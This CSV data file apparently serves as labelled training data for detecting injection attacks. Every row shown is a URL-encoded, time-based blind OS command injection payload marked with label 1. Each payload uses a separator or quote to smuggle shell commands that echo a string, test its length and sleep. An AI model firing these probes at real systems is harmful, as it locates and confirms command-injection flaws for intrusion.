Sentence,Label
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%3B str%3D%24%28echo UBLMDF%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %257C,1
%7C %5B 1 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 2 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 3 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 4 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 5 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 6 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 7 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 8 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%7C %5B 9 -ne %24%28echo FTWOKG %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%26 sleep 0 %26%26 str%3D%24%28echo HSRGRG%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%0A str%3D%24%28echo YQABCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %257C,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%3B str%3D%24%28echo NSANUP%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%27%7C %5B 1 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 2 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 3 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 4 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 5 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 6 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 7 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 8 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%7C %5B 9 -ne %24%28echo JTXVKL %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%26 sleep 0 %26%26 str%3D%24%28echo JICOQS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%0A str%3D%24%28echo JQNEXE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%3B str%3D%24%28echo SVPWDE%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%27%7C %5B 1 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 2 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 3 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 4 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 5 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 6 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 7 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 8 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%7C %5B 9 -ne %24%28echo CVUCAT %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%26 sleep 0 %26%26 str%3D%24%28echo NCCVWU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%0A str%3D%24%28echo LMRVVK%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%3B str%3D%24%28echo RCYHEM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%27%7C %5B 1 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 2 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 3 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 4 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 5 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 6 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 7 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 8 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%7C %5B 9 -ne %24%28echo YGAAWQ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%26 sleep 0 %26%26 str%3D%24%28echo DPWDWF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%0A str%3D%24%28echo BXLXVP%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%27%3B str%3D%24%28echo DHYUHH%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%27%3B str%3D%24%28echo DHYUHH%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%27%3B str%3D%24%28echo DHYUHH%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%27%3B str%3D%24%28echo DHYUHH%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
